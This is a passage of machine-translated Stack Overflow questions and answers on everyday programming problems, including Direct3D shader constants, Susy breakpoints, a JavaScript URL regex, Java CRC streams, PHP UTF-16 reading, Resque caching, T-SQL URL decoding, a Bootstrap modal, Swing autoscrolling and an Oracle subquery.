consttab->SetFloatArray(d3ddev, camposHandle, val, 4); 
```

在此示例中，`d3ddev`是设备对象，而 consttab 是`ID3DXConstantTable`对象。您可以在使用[D3DXCompileShaderFromFile](http://msdn.microsoft.com/en-us/library/windows/desktop/bb172732(v=vs.85).aspx)或其变体之一编译着色器代码时获取此对象。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-07-31T01:27:08.353

随着 D3DX 的弃用，我觉得很多人可以找到这个主题来寻找相同问题的解决方案，就像我一样。

通过解析实际编译的着色器代码，确实有一种方法可以将常量名称转换为寄存器编号。

我找到了一个主题来讨论这个问题并提出了实现这个的工作代码，它完美地工作。我不想功劳，而是链接原作者，因此为“只是”在 GameDev.net 上发布该主题的链接表示歉意：

[http://www.gamedev.net/topic/648016-replacement-for-id3dxconstanttable/#entry5095598](http://www.gamedev.net/topic/648016-replacement-for-id3dxconstanttable/#entry5095598)

该解决方案正是 OP 所要求的，而不是“解决方法”。

# susy-compass - Susy 多响应 Mixin 失败

> ID：15092747
> 
> 赞同：0
> 
> 时间：2013-02-26T15:19:55.217
> 
> 标签：susy-compass

这个人将把我送进一个早期的坟墓，提前感谢您将我拉出来的任何帮助。

简短的故事：`at-breakpoints`从平板电脑网格切换到桌面网格时，列表元素上的多个元素会失败，但在从移动网格切换到平板电脑时效果很好。

顺便说一句，从移动优先的方法开始。

这是标记：

```
<html>
    .
    .
    .
    <div id="container">
        <div id="content">
            <article class="page">
                <ul id="members-frontpage">
                    <li class="member">
                    .
                    .
                    .
                    </li>
                </ul>
            </article>
        </div>
    </div>
    .
    .
    .
<html> 
```

基本的 Susy 配置：

```
@include border-box-sizing;

//Mobile First config
$total-columns  : 4;
$column-width   : 4em;
$gutter-width   : 1em;
$grid-padding   : $gutter-width;

$show-grid-backgrounds  : true;

$legacy-support-for-ie6 : false;
$legacy-support-for-ie7 : false;

//Breaks
$break-to-medium: 30em 12; //break from phone to tablet
$break-to-large: 65em 25; //break from tablet to desktop 
```

基本布局：

```
#container {
    min-height: 100%;
    height: 100%;
    @include container($total-columns, $break-to-medium, $break-to-large);
    @include at-breakpoint($break-to-medium) {
        @include set-container-width;
    }
    @include at-breakpoint($break-to-large) {
        @include set-container-width;
    }
} 
```

最后是当前失败的代码：

什么有效？从移动 4 列网格到平板电脑 12 列网格使用`at-breakpoint`. 甜的！

什么失败了？当从平板电脑网格中分离`omega(2n)`出来时`.member list items`，第二个列表元素会保留它，`omega(2n)`尽管它已移动到不需要它的桌面，因此会破坏所需的 5 栏显示。

从 Firebug`#members-frontpage .member:nth-child(2n)`中提取：#2 列表项。不希望它在那里。希望这是有道理的。

```
.page {
    padding: 0 $grid-padding;
    @include at-breakpoint($break-to-medium) {
        @include susy-grid-background;
    }
    @include at-breakpoint($break-to-large) {
        @include susy-grid-background;
        padding: rhythm(1,16px) 0;
        @include squish(2,2);
    }
}

#members-frontpage { //ul
    @include clearfix;
    list-style: none;
    margin: 0;
    padding: rhythm(1,16px) 0 0 0;
    text-align: center;

    .member {  //li
        position: relative;
        min-height: 15em;
        margin: 0 0 rhythm(2,16px) 0;
        border-radius: .75em;
        border: .1em solid rgba($green, .4);
        background: rgba(255,255,255,.4);

        //Here We Go
        @include at-breakpoint($break-to-medium) {
            @include span-columns(6,12);
            @include nth-omega(2n);
    }
        @include at-breakpoint($break-to-large) {
            @include span-columns(5,25);
            @include nth-omega(5n);
        }

    } //end .member

    .member-title {
        @include rhythm(0,.25,.25,0,16px);
        border-top-left-radius: .75em;
        border-top-right-radius: .75em;
        border-bottom: .1em solid rgba($green, .4);
        background: lighten($yellow, 34%);
    }
    .member-logo {
        @include rhythm(0,1,1,0,16px);
        max-width: 96%;
        height: 100% !important;
    }
    .member-content {
        position: absolute;
        width: 100%;
        bottom: 0;
        @include rhythm(0,0,1,0,16px);
        font-weight: bold;
    }

} // end #member-frontpage 
```

哈克解决方案是`.member element`从父母的 .scss 巢中删除从手机到平板电脑的中断。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T22:53:01.643

是的，Susy 无法假设您想要在断点之间传递什么，以及您不想传递什么。您必须明确，但 Susy 为您提供了两种选择。一个基本上是你已经在做的，但是用漂亮的 Susy 语法编写：

```
@include at-breakpoint($break-to-large) {
  @include span-columns(5,25);
  @include remove-nth-omega(2n); // remove the old one
  @include nth-omega(5n);  // set the new one
} 
```

另一种选择是更紧密地限制您的媒体媒体查询：

```
$break-medium-only: 30em 12 65em; // min and max width settings 
```

如果您使用具有最小和最大设置的断点，则该断点的内容不会延续到您的`large`样式中。

无关：您还可以简化容器设置。现在你正在复制自己。

```
@include container($total-columns, $break-to-medium, $break-to-large); 
```

是相同的

```
@include container;
@include at-breakpoint($break-to-medium) {
  @include set-container-width;
}
@include at-breakpoint($break-to-large) {
  @include set-container-width;
} 
```

你只需要一个或另一个。更长的方法的唯一优点是，如果您出于任何原因需要它，您可以获得更多控制权。但在最简单的情况下，输出是相同的。

# javascript - 无法在 javascript 中测试正则表达式

> ID：15092751
> 
> 赞同：1
> 
> 时间：2013-02-26T15:20:03.323
> 
> 标签：javascript, regex

我对 RegExp 很不熟悉，我试图实现它来检测字符串中的 url。我想使用的一个正则表达式是这个（请不要提供你自己的）：

```
/(((http|ftp|https)://)?[\w-]+(\.[\w-]+)+([\w.,@?^=%&amp;:/~+#-]*[\w@?^=%&amp;/~+#-])?)/g 
```

并用以下内容替换所有匹配项：

```
<a href="$1">$1</a> 
```

如果您使用该示例访问[http://gskinner.com/RegExr/](http://gskinner.com/RegExr/)并在替换中使用它，您会看到它完美无缺，但是不可能在 javascript 中构建一个有效的解决方案。

```
var text = "hi, demo link http://stackoverflow.com is a great website"
//regexp magic

//expected result:
textWithLink ="hi, demo link <a href="http://stackoverflow.com">http://stackoverflow.com</a> is a great website" 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T15:31:55.783

```
var str = 'hi, demo link http://stackoverflow.com is a great website',
    regex = /(((http|ftp|https):\/\/)?[\w-]+(\.[\w-]+)+([\w.,@?^=%&amp;:\/~+#-]*[\w@?^=%&amp;\/~+#-])?)/g;
str.replace(regex, '<a href="$1">$1</a>'); 
```

注意：这是您的确切正则表达式，我只是避开了正斜杠。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T15:22:38.923

你可以这样做

```
var ok = /(((http|ftp|https):\/\/)?[\w-]+(\.[\w-]+)+([\w.,@?^=%&amp;:/~+#-]*[\w@?^=%&amp;/~+#-])?)/.test(str); 
```

测试字符串是否为 URL。

如果要在字符串中查找 URL，请使用

```
var matches = str.match(/(((http|ftp|https):\/\/)?[\w-]+(\.[\w-]+)+([\w.,@?^=%&amp;:/~+#-]*[\w@?^=%&amp;/~+#-])?)/g); 
```

请注意，这是一个[正则表达式文字](https://developer.mozilla.org/en-US/docs/JavaScript/Guide/Regular_Expressions)，我必须转义`/`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-26T15:29:49.263

您提供的 RegExp 文字无效：

```
/(((http|ftp|https)://)?[\w-]+(\.[\w-]+)+([\w.,@?^=%&amp;:/~+#-]*[\w@?^=%&amp;/~+#-])?)/g
^                   ^^
Start               |\__ Error
                    |
                   End 
```

它在您提供的链接中有效，因为该应用程序会自动去除分隔符并无意中修复了错误。

# java - 如何获取输入流的 crc 并返回它的克隆是

> ID：15092758
> 
> 赞同：1
> 
> 时间：2013-02-26T15:20:20.053
> 
> 标签：java, inputstream

我有一个输入流。首先，我需要获取 crc，这就是我所知道的，例如：

```
 CRCUtils.getCRC32(IOUtils.toByteArray(is)) 
```

我在 crcUtils 中有可以从字节数组计算它的方法。但后来我再次需要这个输入流，我不能使用前一个，因为它已经结束了。那么有没有选择如何获取 crc 和克隆的 is ？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2017-02-26T11:34:45.463

在读取流时使用[CheckedInputStream](https://docs.oracle.com/javase/7/docs/api/java/util/zip/CheckedInputStream.html)计算 CRC：

```
CRC32 crc = new CRC32();
try (InputStream in = new CheckedInputStream(new FileInputStream("myfile"), crc)) {
    // read the input ...
}
// now crc contains the checksum of the input
long crc32 = crc.getValue(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:25:30.083

你可以这样做：

```
byte[] byteArr = IOUtils.toByteArray(is);
CRCUtils.getCRC32(byteArr);
InputStream is1 = new ByteArrayInputStream(byteArr); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-26T15:25:42.243

如果支持，您可以在输入流中使用[标记。](http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#mark%28int%29)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-03-13T22:15:51.483

如果您在处理文件之前不需要 CRC 值，您还可以创建一个子类[`FilteredInputStream`](http://docs.oracle.com/javase/7/docs/api/java/io/FilterInputStream.html)，将它读取的所有内容传递给 CRC32，并使用一些额外的方法来获取 CRC 值。

# php - 如何在 PHP 中读取 unicode 文本文件？

> ID：15092764
> 
> 赞同：5
> 
> 时间：2013-02-26T15:20:46.750
> 
> 标签：php, file-io, unicode

我在我的 PHP 脚本中读取文本文件（以 Unicode UTF16-LE 保存）时遇到了一些问题。

我的 PHP 脚本（出于某些原因）以 UTF-8 格式保存。

这是我的代码：

```
$lines = file("./somedir/$filename");

for ($i=0; $i < count($lines); $i++) {
    $lines[$i] = iconv("Unicode", "UTF-8", $lines[$i]); // converting to UTF8
}

echo "[0]:".$lines[0]; // outputs CORRECT text (like "This is the first line")
echo "[1]:".$lines[1]; // outputs something like çæ¤ææ¬çææ¸ææ°ã 
```

请问有什么想法吗？我检查了值，`count($lines)`它完全正确......谢谢。

编辑：
好的，所以我尝试了`iconv("UTF-16", "UTF-8", $lines[$i]);`
我也尝试了`iconv("UTF-16LE", "UTF-8", $lines[$i]);`
但仍然没有成功...

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-02-26T22:42:14.150

PHP 的[`file`](http://php.net/file)函数无法读取 UTF-16LE 编码的文件。它需要在行结束符处进行拆分，但 PHP 在这里只支持单字节序列，UTF-16LE 是一种多字节变长编码，与编码到`file`函数中的行拆分过程不兼容。

因此，您在工作中使用了错误的功能。答案就是这么简单。不是`iconv`这里的问题，而只是使用`file`.

相反，您需要将文件读入缓冲区，一行接一行地从缓冲区中取出，然后重新编码为 UTF-8。

首先要了解该文件中使用的行分隔符。由于 PHP 的文件函数（和字符串函数以及字符串本身）是基于二进制的，因此采用[字符串](http://php.net/strings)形式的二进制序列和[`strpos`](http://php.net/strpos)定位它的函数。

然后从缓冲区中逐行拆分（如果字节用完，请再次从文件中重新填充缓冲区），然后您可以`iconv`按照手册页中的说明使用（或者您的问题，您没有查看的示例代码错了，请注意使用正确的参数，以便编码正确）。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2017-08-22T00:22:20.403

以下代码适用于我：

只需使用以下函数 fopen_utf8 而不是 fopen。

```
<?php
# http://www.practicalweb.co.uk/blog/2008/05/18/reading-a-unicode-excel-file-in-php/
function fopen_utf8($filename){
    $encoding='';
    $handle = fopen($filename, 'r');
    $bom = fread($handle, 2);
//  fclose($handle);
    rewind($handle);

    if($bom === chr(0xff).chr(0xfe)  || $bom === chr(0xfe).chr(0xff)){
            // UTF16 Byte Order Mark present
            $encoding = 'UTF-16';
    } else {
        $file_sample = fread($handle, 1000) + 'e'; //read first 1000 bytes
        // + e is a workaround for mb_string bug
        rewind($handle);

        $encoding = mb_detect_encoding($file_sample , 'UTF-8, UTF-7, ASCII, EUC-JP,SJIS, eucJP-win, SJIS-win, JIS, ISO-2022-JP');
    }
    if ($encoding){
        stream_filter_append($handle, 'convert.iconv.'.$encoding.'/UTF-8');
    }
    return  ($handle);
} 
?> 
```

[从这个网站](http://www.practicalweb.co.uk/blog/2008/05/18/reading-a-unicode-excel-file-in-php/)

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2014-07-21T08:39:14.693

这是我用来将 Unicode 转换为普通文本格式的代码。

```
function ReadUnicodeFile($fn)    
  $fc = "";    
  $fh = fopen($fn,"rb") or die("Cannot open file for read: $fn&lt;br&gt;\n");    
  $flen = filesize($fn);    
  $bc = fread($fh, $flen);

  for ($i=0; $i&lt;$flen; $i++){    
    $c = substr($bc,$i,1);    
    if ((ord($c) != 0) && (ord($c) != 13))    
      $fc = $fc . $c;    
  }

  if ((ord(substr($fc,0,1)) == 255) && (ord(substr($fc,1,1)) == 254))    
    $fc = substr($fc,2);    
  return ($fc);    
} 
```

# ruby-on-rails - Resque 缓存活动记录校准

> ID：15092766
> 
> 赞同：2
> 
> 时间：2013-02-26T15:20:51.243
> 
> 标签：ruby-on-rails, activerecord, redis, resque

我有一个简单的 resque 作业，它接受模型 ID，获取它，然后在获取的项目上调用一个方法。

```
class CupcakeWorker
  @queue = :cupcake_queue
  def self.perform(cupcake_id)
    @cupcake = Cupcake.find(cupcake_id)
    p @cupcake
  end
end 
```

我从 Cupcake 的模型中排队，after_commit 使用 'enqueue' 方法

```
def bake
  Resque.enqueue(CupcakeWorker, self.id)
end 
```

作业排队并正确执行。但是，如果我在数据库中或通过 UI 修改记录的数据并继续对作业进行排队，则不会使用新值执行操作。

如果我重新启动 resque 工作进程，我只能让它获取新值。resque 是否正在缓存对象？有没有办法确保每次调用工作人员时都从数据库中重新获取？

### 编辑：

我什至提取了查询日志……提交发生在获取纸杯蛋糕的选择查询之前……所以这既不是订单的竞争条件，也不是查询获取它时的缓存问题……我是无能的家伙。 。 会是什么呢？ **顺便说一句，我在 rails 2.3.8 和 redis n resque 组合中使用 after_commit gem**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-23T00:44:06.927

我遇到了完全相同症状的问题

深入挖掘后我发现，我的问题出在命名范围内

我有这样的表演：

```
letter = Letter.to_process.first 
```

在模型中我有

```
scope :to_process, where("scheduled_at < ?", Time.now).where('finished_at IS NULL').order('scheduled_at') 
```

这是错误的，因为它始终以与第一次执行命名范围时相同的 schedule_at 值运行

这是正确的

```
scope :to_process, lambda { where("scheduled_at < ?", Time.now).where('finished_at IS NULL').order('scheduled_at') } 
```

如果这与您的情况无关 - 如果您对普通的 find(id) 有问题，请尝试添加

```
Cupcake.connection.clear_query_cache 
```

在您的执行方法结束时

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T17:23:48.027

您可以尝试使用此代码强制 resque 访问数据库

```
ActiveRecord::Base.uncached do
  @cupcake = Cupcake.find(cupcake_id)
end 
```

未缓存在[2.3.8中可用](http://apidock.com/rails/ActiveRecord/QueryCache/ClassMethods/uncached)

这应该有效，除非问题不是真正的缓存问题。让我们知道它是否适合您。

# sql-server - 网址解码 T-SQL 函数不翻译超出 ascii 范围的字符

> ID：15092770
> 
> 赞同：2
> 
> 时间：2013-02-26T15:21:03.817
> 
> 标签：sql-server, tsql, ascii, urldecode, non-ascii-characters

我正在使用这个函数来解码 url 编码的字符串：

```
ALTER FUNCTION [dbo].[UrlDecode](@url varchar(3072)) 
RETURNS varchar(3072) 
AS 
BEGIN 
    DECLARE @Position INT,
        @Base CHAR(16),
        @High TINYINT,
        @Low TINYINT,
        @Pattern CHAR(21)

    SELECT  @Base = '0123456789abcdef',
        @Pattern = '%[%][0-9a-f][0-9a-f]%',
        @URL = REPLACE(@URL, '+', ' '),
        @Position = PATINDEX(@Pattern, @URL)

    WHILE @Position > 0
        SELECT  @High = CHARINDEX(SUBSTRING(@URL, @Position + 1, 1), @Base COLLATE Latin1_General_CI_AS),
            @Low = CHARINDEX(SUBSTRING(@URL, @Position + 2, 1), @Base COLLATE Latin1_General_CI_AS),
            @URL = STUFF(@URL, @Position, 3, CHAR(16 * @High + @Low - 17)),
            @Position = PATINDEX(@Pattern, @URL)

    RETURN  @URL + 
END 
```

这工作正常，直到它达到特殊的 ascii 范围之外的字符。示例：`Wil+SG+1`将返回`Wil SG 1`没问题。虽然`Gen%C3%A8ve+11`返回`GenÃ¨ve 11`不是我所期望的（`Genève 11`在这种情况下是预期的结果）。

另一个例子 ：

```
select 'Gen%C3%A8ve+2+D%C3%A9p%C3%B4t', dbo.UrlDecode('Gen%C3%A8ve+2+D%C3%A9p%C3%B4t') 
```

返回：

```
Gen%C3%A8ve+2+D%C3%A9p%C3%B4t   GenÃ¨ve 2 DÃ©pÃ´t 
```

我试过用 NCHAR 代替 CHAR 但结果是一样的。你知道我能做些什么来支持这些扩展的 ascii 字符吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T20:19:09.883

URL 以 UTF-8 编码。您的函数所做的只是将 URL 的 UTF-8 表示的十六进制代码替换为与十六进制代码匹配的字符。

您真正需要的是将 URL 编码的 UTF-8 替换为 MSSQL UCS-2 的功能，如[Social.MSDN 上的此答案中所述](http://social.msdn.microsoft.com/Forums/en-US/transactsql/thread/c1d1037a-b09c-4cca-a3c0-a99edb274eb9/)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-27T07:37:47.387

我发现这个功能完全符合我的要求：

```
ALTER FUNCTION [dbo].[UrlDecodeUTF8](@URL varchar(3072))
RETURNS varchar(3072)
AS
BEGIN 
    DECLARE @Position INT,
        @Base CHAR(16),
        @Code INT,
        @Pattern CHAR(21)

    SELECT @URL = REPLACE(@URL, '%c3', '')

    SELECT  @Base = '0123456789abcdef',
        @Pattern = '%[%][0-9a-f][0-9a-f]%',
        @Position = PATINDEX(@Pattern, @URL)

    WHILE @Position > 0
        SELECT @Code = Cast(CONVERT(varbinary(4), '0x' + SUBSTRING(@URL, @Position + 1, 2), 1) As int),
            @URL = STUFF(@URL, @Position, 3, NCHAR(@Code + 64)),
            @Position = PATINDEX(@Pattern, @URL)

    RETURN REPLACE(@URL, '+', ' ')

END 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-02-26T17:47:40.487

我怀疑您需要使用排序规则，用一些等效的 ascii 替换 UTF 代码。这是我的代码库中的一个示例：

```
REPLACE(CHAR(228) COLLATE Latin1_General_BIN, CHAR(196), 'Y') 
```

# jquery - 页脚按钮上的 boostrap 模态调用函数单击

> ID：15092771
> 
> 赞同：0
> 
> 时间：2013-02-26T15:21:09.337
> 
> 标签：jquery, function, button, twitter-bootstrap, modal-dialog

我正在尝试在引导程序上构建一个可配置的模式窗口。我的意图是通过创建函数参数来动态填充模态。

第一个参数是标题的标题（`titolo`），第二个（`messaggio`）是模态体的文本，可以是html或纯文本，第三个（`conferma`）是确认按钮时调用的函数（如果存在此函数则创建）被点击时，forth( `callback`) 是模式窗口关闭时调用的回调函数。

不幸的是我不能让它工作，你能帮我吗？

```
function apriModal(titolo,messaggio,conferma,callback){
    jQuery.noConflict();
    var re=new RegExp("</?\w+\s+[^>]*>");
    $("#modalHeaderTitle").text(titolo);
    if(messaggio.match(re)){
        $("#modalBodyText").html(messaggio);
    }
    else{
        $("#modalBodyText").html("<p>"+messaggio+"</p>");
    }
    (typeof conferma == 'function') ? $("#modalConfirm").show() : $("#modalConfirm").hide();
    $("#finestraModal").modal('show');
    $("#modalConfirm").click(function(){
        if(conferma){
            $("#finestraModal").modal('hide');
            conferma.apply();
        }
    });
    $("#modalClose").click(function(){
        if(callback){
            callback.apply();
        }
        $("#finestraModal").modal('hide');
    });
} 
```

这是模态的基本html：

```
<div id="finestraModal" class="modal hide fade">
    <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
        <h3 id="modalHeaderTitle"></h3>
    </div>
    <div class="modal-body" id="modalBodyText">
    </div>
    <div class="modal-footer">
        <a href="#" id="modalClose" class="btn">Chiudi</a>
        <a href="#" id="modalConfirm" class="btn btn-primary">Conferma</a>
    </div>
</div> 
```

[JSFiddle](http://jsfiddle.net/X3EnA/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T18:40:36.890

您已使用`jQuery.noConflict()`但继续`$`在以下脚本中使用。

```
function apriModal(titolo,messaggio,conferma,callback){
    jQuery.noConflict(); 
```

应该改为

```
function apriModal(titolo,messaggio,conferma,callback){
    var $ = jQuery.noConflict(); // or other variable name 
```

如果您想使用其他库，您可以分配`jQuery.noConflict()`给另一个变量，如我的演示中所示，或者`jQuery`在需要时使用。

参考：[http ://api.jquery.com/jQuery.noConflict/](http://api.jquery.com/jQuery.noConflict/)

工作演示：http: [//jsfiddle.net/indream/X3EnA/1/](http://jsfiddle.net/indream/X3EnA/1/)

# java - Java中的“智能”自动滚动？

> ID：15092782
> 
> 赞同：1
> 
> 时间：2013-02-26T15:21:48.503
> 
> 标签：java, swing, concurrency, jscrollpane, jtextarea

注意：我重新提出[这个](https://stackoverflow.com/questions/3392290/smart-jscrollpane-autoscrolling)问题是因为我需要一个答案，而那里的答案链接断开。

我正在编写一个简单的聊天程序，作为学校项目的一部分，我希望用户能够自动跟踪消息，如果它们在底部，但如果它们在底部，则不必再次向上滚动。看着更高的东西。目前，无论如何，我的代码都只是滚动到底部。基本代码如下，我真的不知道如何将其转换为 SSCCE。如果有人可以，请随时这样做。

```
JTextArea jta = new JTextArea(50, 50);
JScrollPane scroll = new JScrollPane(jta);
try {
    int iter = 0;
    while (true) { //Not a for loop because it should not end after x iterations
        Thread.sleep(500);
        jta.append("Test text #" + iter);
        iter++;
        //Check if they are at the bottom and if so scroll down to the new bottom.
    }
} catch (InterruptedException ex) {
    System.out.println("Error!");
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T15:59:43.307

不确定这是不是最好的方法，但这里有一些代码可以在用户向上滚动时停止向下滚动。当他滚动回到底部时，自动滚动再次开始。

这个想法是通过比较文本区域的高度和滚动窗格的可见矩形的位置和高度来检查用户是否向上移动。如果匹配，则意味着滚动在底部，用户想要自动滚动。在另一种情况下，我们会强制可见矩形在每次 textarea 更改时保持不变。

小型[SSCCE](http://sscce.org) :

```
import java.awt.BorderLayout;
import java.awt.Rectangle;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.JFrame;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.SwingUtilities;
import javax.swing.Timer;

public class TestScrollbars {

    protected void initUI() {
        final JFrame frame = new JFrame();
        frame.setTitle(TestScrollbars.class.getSimpleName());
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        final JTextArea chat = new JTextArea(10, 40);
        chat.setLineWrap(true);
        chat.setEditable(false);
        chat.setWrapStyleWord(false);
        final JScrollPane scrollPane = new JScrollPane(chat);
        scrollPane.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_NEVER);
        frame.setLayout(new BorderLayout());
        frame.add(scrollPane, BorderLayout.CENTER);
        frame.pack();
        frame.setVisible(true);
        Timer t = new Timer(200, new ActionListener() {

            private int i = 1;

            @Override
            public void actionPerformed(ActionEvent e) {
                final Rectangle visibleRect = chat.getVisibleRect();
                boolean scroll = chat.getHeight() <= visibleRect.y + visibleRect.height;
                chat.append("Hello line " + i++ + "\n");
                if (!scroll) {
                    SwingUtilities.invokeLater(new Runnable() {
                        @Override
                        public void run() {
                            chat.scrollRectToVisible(visibleRect);
                        }
                    });
                }
            }
        });
        t.start();
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                new TestScrollbars().initUI();
            }
        });
    }

} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-26T18:22:50.367

编辑：

我将以下代码替换为更灵活的版本，该版本适用于 JScrollPane 中的任何组件。签出：[智能滚动](http://tips4java.wordpress.com/2013/03/03/smart-scrolling/)。

下面是一些可重用的代码，任何包含 JTextArea 或 JTextPane 的滚动窗格都可以使用它们：

```
import java.awt.*;
import java.awt.event.*;
import java.util.Date;
import javax.swing.*;
import javax.swing.text.*;

public class ScrollControl implements AdjustmentListener
{
    private JScrollBar scrollBar;
    private JTextComponent textComponent;
    private int previousExtent = -1;

    public ScrollControl(JScrollPane scrollPane)
    {
        Component view = scrollPane.getViewport().getView();

        if (! (view instanceof JTextComponent))
            throw new IllegalArgumentException("Scrollpane must contain a JTextComponent");

        textComponent = (JTextComponent)view;

        scrollBar = scrollPane.getVerticalScrollBar();
        scrollBar.addAdjustmentListener( this );
    }

    @Override
    public void adjustmentValueChanged(final AdjustmentEvent e)
    {
        SwingUtilities.invokeLater(new Runnable()
        {
            public void run()
            {
                checkScrollBar(e);
            }
        });
    }

    private void checkScrollBar(AdjustmentEvent e)
    {
        //  The scroll bar model contains information needed to determine the
        //  caret update policy.

        JScrollBar scrollBar = (JScrollBar)e.getSource();
        BoundedRangeModel model = scrollBar.getModel();
        int value = model.getValue();
        int extent = model.getExtent();
        int maximum = model.getMaximum();
        DefaultCaret caret = (DefaultCaret)textComponent.getCaret();

        //  When the size of the viewport changes there is no need to change the
        //  caret update policy.

        if (previousExtent != extent)
        {
            //  When the height of a scrollpane is decreased the scrollbar is
            //  moved up from the bottom for some reason. Reposition the
            //  scrollbar at the bottom

            if (extent < previousExtent
            &&  caret.getUpdatePolicy() == DefaultCaret.UPDATE_WHEN_ON_EDT)
            {
                scrollBar.setValue( maximum );
            }

            previousExtent = extent;
            return;
        }

        //  Text components will not scroll to the bottom of a scroll pane when
        //  a bottom inset is used. Therefore the location of the scrollbar,
        //  the height of the viewport, and the bottom inset value must be
        //  considered when determining if the scrollbar is at the bottom.

        int bottom = textComponent.getInsets().bottom;

        if (value + extent + bottom < maximum)
        {
            if (caret.getUpdatePolicy() != DefaultCaret.NEVER_UPDATE)
                caret.setUpdatePolicy(DefaultCaret.NEVER_UPDATE);
        }
        else
        {
            if (caret.getUpdatePolicy() != DefaultCaret.UPDATE_WHEN_ON_EDT)
            {
                caret.setDot(textComponent.getDocument().getLength());
                caret.setUpdatePolicy(DefaultCaret.UPDATE_WHEN_ON_EDT);
            }
        }
    }

    private static void createAndShowUI()
    {
        JPanel center = new JPanel( new GridLayout(1, 2) );
        String text = "1\n2\n3\n4\n5\n6\n7\n8\n9\n0\n";

        final JTextArea textArea = new JTextArea();
        textArea.setText( text );
        textArea.setEditable( false );
        center.add( createScrollPane( textArea ) );
        System.out.println(textArea.getInsets());

        final JTextPane textPane = new JTextPane();
        textPane.setText( text );
        textPane.setEditable( false );
        center.add( createScrollPane( textPane )  );
        textPane.setMargin( new Insets(5, 3, 7, 3) );
        System.out.println(textPane.getInsets());

        JFrame frame = new JFrame();
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.add(center, BorderLayout.CENTER);
        frame.setSize(500, 200);
        frame.setLocationRelativeTo(null);
        frame.setVisible(true);

        Timer timer = new Timer(2000, new ActionListener()
        {
            public void actionPerformed(ActionEvent e)
            {
                try
                {
                    Date now = new Date();
                    textArea.getDocument().insertString(textArea.getDocument().getLength(), "\n" + now.toString(), null);
                    textPane.getDocument().insertString(textPane.getDocument().getLength(), "\n" + now.toString(), null);
                }
                catch (BadLocationException e1) {}
            }
        });
        timer.start();
    }

    private static JComponent createScrollPane(JComponent component)
    {
        JScrollPane scrollPane = new JScrollPane(component);
        new ScrollControl( scrollPane );

        return scrollPane;
    }

    public static void main(String[] args)
    {
        EventQueue.invokeLater(new Runnable()
        {
            public void run()
            {
                createAndShowUI();
            }
        });
    }
} 
```

编辑：

更新了代码，以便在滚动窗格的高度降低时它也可以工作。由于某种原因，默认行为是将滚动条向上移动一行，这意味着添加新文本时滚动条将不再保留在底部。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-26T16:08:00.017

旧的 Apple MacOS 方式是可以拥有（几个）自动拆分窗格，这些窗格可以从下方向上撕裂，然后再次掉落。

他们将在同一个 StyledDocument 上创建多个视图（文本框），其中只有底部的视图会自动滚动。

# sql - 是否需要多个子查询才能从同一个表中的 2 个字段中选择最大值

> ID：15092784
> 
> 赞同：2
> 
> 时间：2013-02-26T15:21:51.590
> 
> 标签：sql, oracle, subquery

我对 SQL 比较陌生。我相信我需要在我的 Oracle 查询中进行多个子选择才能获得我感兴趣的结果，但我一直无法让查询正常工作。

我需要从“客户”表中提取基本数据，并从第二个表“客户问题”中提取附加数据。还有其他表包含我需要的其他字段，但我已通过连接到“客户”表成功地连接/选择了该数据

我需要的“Customer_Issue”数据位于“Service”、“Service_Issue”和“Service Version”字段中。每个服务有多个服务问题，每个服务问题有多个服务版本。

对于每个服务，我只需要选择最大服务问题，对于选择的服务问题，我只需要选择最大服务版本。

通过子选择，我已经能够选择最大服务问题，如下所示：

```
Select c.customer_id, ci.service, ci.service_issue
from customer c
left outer join CUSTOMER_issue ci on c.CUSTOMER_ID = ci.CUSTOMER_ID
join (select CUSTOMER_ID, service, max(service_ISSUE) as service_ISSUE
from CUSTOMER_issue
group by CUSTOMER_ID, service) ci1
on ci1.CUSTOMER_ID = ci.CUSTOMER_ID and ci1.service = ci.service
and ci1.service_issue = ci.service_issue 
```

但是，我无法获得后续的子选择来获得最大服务版本。这是我尝试过的（在查询中，它直接在上面的代码下方）

```
join (select CUSTOMER_ID, service, service_ISSUE, max (service_VERSION) as service_VERSION
from CUSTOMER_issue
group by CUSTOMER_ID, service, service_ISSUE) ci2
on ci1.CUSTOMER_ID = ci2.CUSTOMER_ID and ci1.service = ci2.service and
ci1.service_ISSUE = ci2.service_ISSUE and ci1.service_VERSION = ci2.service_VERSION 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:27:37.223

我怀疑你想要最高版本的最高版本。我不确定，但这就是我解释这个问题的方式。

如果是这样，最好的解决方案是使用`row_number()`：

```
select  c.customer_id, ci.service, ci.service_issue     
from customer c left outer join
     (select ci.*,
             ROW_NUMBER() over (partition by ci.customer_id, ci.service
                                order by service_issue desc, service_version desc
                               ) as seqnum
      from CUSTOMER_issue ci
     ) ci
